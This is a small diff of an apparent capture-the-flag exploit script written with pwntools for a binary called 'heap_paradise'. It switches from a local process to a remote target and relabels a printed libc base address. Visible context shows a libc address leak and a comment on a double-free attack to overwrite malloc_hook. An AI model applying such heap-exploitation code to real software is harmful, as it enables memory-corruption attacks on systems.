@@ -1,7 +1,7 @@
 from pwn import *
 import random
 
-local = True
+local = False
 
 if local:
 	r = process("./heap_paradise")
@@ -128,7 +128,7 @@ result = result[:8]
 result = u64(result)
 libc_base = result + 0xf0 - stdin_off
 
-print hex(libc_base)
+print "Libc_base = " + hex(libc_base)
 
 # make double free attack to overwrite malloc_hook
 free(0)
